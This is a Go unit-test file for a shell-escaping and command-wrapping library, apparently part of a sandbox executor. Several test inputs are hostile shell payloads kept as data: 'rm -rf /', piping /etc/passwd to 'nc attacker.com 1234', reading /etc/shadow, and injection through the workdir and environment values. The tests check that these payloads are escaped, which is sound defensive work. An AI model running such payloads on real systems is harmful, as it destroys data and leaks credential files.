package exec

import (
	"testing"

	"github.com/stretchr/testify/assert"
)

func TestShellEscape_PreventsCommandInjection(t *testing.T) {
	testCases := []struct {
		name     string
		input    string
		expected string
	}{
		{
			name:     "simple command",
			input:    "echo hello",
			expected: "'echo hello'",
		},
		{
			name:     "command with semicolon",
			input:    "ls; rm -rf /",
			expected: "'ls; rm -rf /'",
		},
		{
			name:     "command with backtick",
			input:    "echo `whoami`",
			expected: "'echo `whoami`'",
		},
		{
			name:     "command with pipe",
			input:    "cat /etc/passwd | nc attacker.com 1234",
			expected: "'cat /etc/passwd | nc attacker.com 1234'",
		},
		{
			name:     "command with dollar sign",
			input:    "echo $HOME",
			expected: "'echo $HOME'",
		},
		{
			name:     "command with newline",
			input:    "ls\ncat /etc/shadow",
			expected: "'ls\ncat /etc/shadow'",
		},
		{
			name:     "command with single quote",
			input:    "it's a test",
			expected: "'it'\\''s a test'",
		},
		{
			name:     "empty string",
			input:    "",
			expected: "''",
		},
		{
			name:     "command with exclamation mark",
			input:    "echo hello!",
			expected: "'echo hello!'",
		},
		{
			name:     "command with ampersand",
			input:    "echo hello&world",
			expected: "'echo hello&world'",
		},
		{
			name:     "command with parentheses",
			input:    "echo (test)",
			expected: "'echo (test)'",
		},
		{
			name:     "command with backslash",
			input:    "echo \\n",
			expected: "'echo \\n'",
		},
		{
			name:     "command with double quote",
			input:    `echo "hello"`,
			expected: `'echo "hello"'`,
		},
		{
			name:     "multiple single quotes",
			input:    "it's a 'test' here",
			expected: "'it'\\''s a '\\''test'\\'' here'",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result := shellEscape(tc.input)
			assert.Equal(t, tc.expected, result)
		})
	}
}

func TestBuildCommand_SafeFromInjection(t *testing.T) {
	wrapper := NewWrapper("sh", []string{"-c"}, "__SBX_EXIT_CODE__", "stderr")

	// 尝试注入攻击
	maliciousCmd := []string{"rm", "-rf", "/", ";", "nc", "attacker.com", "1234"}
	cmd := wrapper.BuildCommand(nil, "/workspace", maliciousCmd)

	// 验证命令被正确转义
	assert.Contains(t, cmd, "'rm'")
	assert.Contains(t, cmd, "'-rf'")
	assert.Contains(t, cmd, "'/'")
	assert.Contains(t, cmd, "';'")
	assert.Contains(t, cmd, "'nc'")
	// 所有参数都被单引号包裹，防止注入
}

func TestBuildCommand_WithMaliciousWorkdir(t *testing.T) {
	wrapper := NewWrapper("sh", []string{"-c"}, "__SBX_EXIT_CODE__", "stderr")

	testCases := []struct {
		name     string
		workdir  string
		contains []string
	}{
		{
			name:    "workdir with semicolon injection",
			workdir: "/tmp; rm -rf /",
			contains: []string{
				"'/tmp; rm -rf /'",
			},
		},
		{
			name:    "workdir with backtick injection",
			workdir: "/tmp`whoami`",
			contains: []string{
				"'/tmp`whoami`'",
			},
		},
		{
			name:    "workdir with pipe injection",
			workdir: "/tmp | nc attacker.com 1234",
			contains: []string{
				"'/tmp | nc attacker.com 1234'",
			},
		},
		{
			name:    "workdir with newline injection",
			workdir: "/tmp\ncat /etc/shadow",
			contains: []string{
				"'/tmp\ncat /etc/shadow'",
			},
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			cmd := wrapper.BuildCommand(nil, tc.workdir, []string{"ls"})
			for _, expected := range tc.contains {
				assert.Contains(t, cmd, expected)
			}
		})
	}
}

func TestBuildCommand_WithMaliciousEnvValue(t *testing.T) {
	wrapper := NewWrapper("sh", []string{"-c"}, "__SBX_EXIT_CODE__", "stderr")

	testCases := []struct {
		name      string
		env       map[string]string
		contains  []string
	}{
		{
			name: "env value with command substitution",
			env: map[string]string{
				"PATH": "/bin:$(whoami)",
			},
			contains: []string{
				"'/bin:$(whoami)'",
			},
		},
		{
			name: "env value with backtick",
			env: map[string]string{
				"TEST": "`rm -rf /`",
			},
			contains: []string{
				"'`rm -rf /`'",
			},
		},
		{
			name: "env value with pipe",
			env: map[string]string{
				"VAR": "value|nc attacker.com 1234",
			},
			contains: []string{
				"'value|nc attacker.com 1234'",
			},
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			cmd := wrapper.BuildCommand(tc.env, "/tmp", []string{"ls"})
			for _, expected := range tc.contains {
				assert.Contains(t, cmd, expected)
			}
		})
	}
}

func TestShellEscape_SecurityProperties(t *testing.T) {
	// Verify that escaped strings cannot break out of single quotes
	// when used in a shell command

	testCases := []struct {
		name  string
		input string
	}{
		{
			name:  "single quote escape attempt",
			input: "'",
		},
		{
			name:  "single quote in middle",
			input: "it's",
		},
		{
			name:  "multiple single quotes",
			input: "'a''b'",
		},
		{
			name:  "all special characters",
			input: ";|&$()`<>{}[]!~*?\\",
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			escaped := shellEscape(tc.input)

			// The escaped string should start and end with single quotes
			assert.Equal(t, "'", escaped[0:1], "Escaped string should start with single quote")
			assert.Equal(t, "'", escaped[len(escaped)-1:], "Escaped string should end with single quote")

			// When properly escaped, there should be no unbalanced single quotes
			// (i.e., single quotes should always be paired as '\'')
			// This is a simplified check - the actual safety comes from the
			// fact that single quotes are closed and reopened properly
		})
	}
}

func TestGetCommandArgs(t *testing.T) {
	wrapper := NewWrapper("sh", []string{"-c"}, "__SBX_EXIT_CODE__", "stderr")

	t.Run("simple command", func(t *testing.T) {
		args := wrapper.GetCommandArgs(nil, "/workspace", []string{"ls", "-la"})
		assert.Equal(t, "sh", args[0])
		assert.Equal(t, "-c", args[1])
		assert.Contains(t, args[2], "'ls'")
		assert.Contains(t, args[2], "'-la'")
	})

	t.Run("with env vars", func(t *testing.T) {
		env := map[string]string{"FOO": "bar"}
		args := wrapper.GetCommandArgs(env, "/workspace", []string{"echo", "$FOO"})
		assert.Equal(t, "sh", args[0])
		assert.Equal(t, "-c", args[1])
		assert.Contains(t, args[2], "export FOO=")
		assert.Contains(t, args[2], "'bar'")
	})

	t.Run("with custom workdir", func(t *testing.T) {
		args := wrapper.GetCommandArgs(nil, "/tmp/mydir", []string{"pwd"})
		assert.Contains(t, args[2], "cd '/tmp/mydir'")
	})

	t.Run("with multiple shell args", func(t *testing.T) {
		w := NewWrapper("bash", []string{"-l", "-c"}, "__EXIT__", "stderr")
		args := w.GetCommandArgs(nil, "/workspace", []string{"ls"})
		assert.Equal(t, "bash", args[0])
		assert.Equal(t, "-l", args[1])
		assert.Equal(t, "-c", args[2])
		assert.Contains(t, args[3], "'ls'")
	})

	t.Run("exit code marker in stderr", func(t *testing.T) {
		args := wrapper.GetCommandArgs(nil, "/workspace", []string{"ls"})
		assert.Contains(t, args[2], `echo "__SBX_EXIT_CODE__=$_ec" >&2`)
	})

	t.Run("exit code marker in stdout", func(t *testing.T) {
		w := NewWrapper("sh", []string{"-c"}, "__EXIT__", "stdout")
		args := w.GetCommandArgs(nil, "/workspace", []string{"ls"})
		assert.Contains(t, args[2], `echo "__EXIT__=$_ec"`)
		assert.NotContains(t, args[2], ">&2")
	})

	t.Run("subshell wrapping ensures marker always fires", func(t *testing.T) {
		args := wrapper.GetCommandArgs(nil, "/workspace", []string{"false"})
		// The command should use a subshell with ; separators
		assert.Contains(t, args[2], "( 'false' ; _ec=$? ;")
		assert.Contains(t, args[2], "; exit $_ec )")
	})
}

func TestIsCommandWithStringArg(t *testing.T) {
	testCases := []struct {
		name     string
		cmd      []string
		expected bool
	}{
		{"sh -c command", []string{"sh", "-c", "echo hello"}, true},
		{"bash -c command", []string{"bash", "-c", "ls -la"}, true},
		{"python -c command", []string{"python", "-c", "print('hi')"}, true},
		{"node -c command", []string{"node", "-c", "console.log(1)"}, true},
		{"too few args", []string{"sh", "-c"}, false},
		{"not -c flag", []string{"sh", "-e", "echo hello"}, false},
		{"unknown interpreter", []string{"gcc", "-c", "file.c"}, false},
		{"empty cmd", []string{}, false},
		{"single arg", []string{"ls"}, false},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result := isCommandWithStringArg(tc.cmd)
			assert.Equal(t, tc.expected, result)
		})
	}
}

func TestBuildStringArgCommand(t *testing.T) {
	testCases := []struct {
		name     string
		cmd      []string
		expected string
	}{
		{
			name:     "simple sh -c",
			cmd:      []string{"sh", "-c", "echo hello"},
			expected: `sh -c "echo hello"`,
		},
		{
			name:     "command with double quotes",
			cmd:      []string{"bash", "-c", `echo "world"`},
			expected: `bash -c "echo \"world\""`,
		},
		{
			name:     "command with variable expansion preserved",
			cmd:      []string{"sh", "-c", "echo $HOME"},
			expected: `sh -c "echo $HOME"`,
		},
		{
			name:     "multi-part command string",
			cmd:      []string{"sh", "-c", "echo", "hello", "world"},
			expected: `sh -c "echo hello world"`,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result := buildStringArgCommand(tc.cmd)
			assert.Equal(t, tc.expected, result)
		})
	}
}

func TestValidateEnvKey(t *testing.T) {
	// Note: ValidateEnvKey does basic shell variable name validation,
	// not regex-based validation. It allows both upper and lowercase.
	testCases := []struct {
		name     string
		key      string
		regex    string
		expected bool
	}{
		{"valid uppercase", "HOME", "", true},
		{"valid with underscore", "MY_VAR", "", true},
		{"valid with numbers", "VAR123", "", true},
		{"starts with underscore", "_VAR", "", true},
		{"lowercase valid", "myvar", "", true},
		{"mixed case valid", "MyVar", "", true},
		{"starts with number rejected", "1VAR", "", false},
		{"contains dash rejected", "MY-VAR", "", false},
		{"contains dot rejected", "MY.VAR", "", false},
		{"contains space rejected", "MY VAR", "", false},
		{"empty key rejected", "", "", false},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result := ValidateEnvKey(tc.key, tc.regex)
			assert.Equal(t, tc.expected, result)
		})
	}
}

func TestBuildCommand_EmptyCmd(t *testing.T) {
	wrapper := NewWrapper("sh", []string{"-c"}, "__SBX_EXIT_CODE__", "stderr")
	cmd := wrapper.BuildCommand(nil, "/workspace", []string{})
	// Empty cmd should produce "true" (no-op) inside a subshell
	assert.Contains(t, cmd, "true")
	assert.Contains(t, cmd, "cd '/workspace'")
	assert.Contains(t, cmd, "( true ; _ec=$?")
}

func TestBuildCommand_SubshellMarkerAlwaysFires(t *testing.T) {
	wrapper := NewWrapper("sh", []string{"-c"}, "__SBX_EXIT_CODE__", "stderr")

	t.Run("marker uses semicolons not ampersands", func(t *testing.T) {
		cmd := wrapper.BuildCommand(nil, "/workspace", []string{"ls", "-la"})
		// The subshell must use ; separators so the marker fires on failure
		assert.Contains(t, cmd, "( 'ls' '-la' ; _ec=$? ; ")
		assert.Contains(t, cmd, `echo "__SBX_EXIT_CODE__=$_ec" >&2`)
		assert.Contains(t, cmd, "; exit $_ec )")
	})

	t.Run("cd uses && but subshell uses semicolons", func(t *testing.T) {
		cmd := wrapper.BuildCommand(nil, "/workspace", []string{"false"})
		// cd should use && (must succeed before running command)
		assert.Contains(t, cmd, "cd '/workspace' && (")
	})

	t.Run("with env and workdir", func(t *testing.T) {
		env := map[string]string{"FOO": "bar"}
		cmd := wrapper.BuildCommand(env, "/workspace", []string{"echo", "$FOO"})
		// Env exports use &&, then cd uses &&, then subshell
		assert.Contains(t, cmd, "export FOO='bar'")
		assert.Contains(t, cmd, "&& cd '/workspace' && (")
		assert.Contains(t, cmd, "; _ec=$? ;")
	})
}

func TestEscapeForDoubleQuotes_PreservesVariables(t *testing.T) {
	testCases := []struct {
		name     string
		input    string
		expected string
	}{
		{
			name:     "dollar sign preserved",
			input:    "$HOME",
			expected: "$HOME",
		},
		{
			name:     "backtick preserved",
			input:    "`whoami`",
			expected: "`whoami`",
		},
		{
			name:     "double quote escaped",
			input:    `"hello"`,
			expected: `\"hello\"`,
		},
		{
			name:     "backslash escaped",
			input:    `\n`,
			expected: `\\n`,
		},
		{
			name:     "mixed special chars",
			input:    `echo "$HOME" && date`,
			expected: `echo \"$HOME\" && date`,
		},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result := escapeForDoubleQuotes(tc.input)
			assert.Equal(t, tc.expected, result)
		})
	}
}
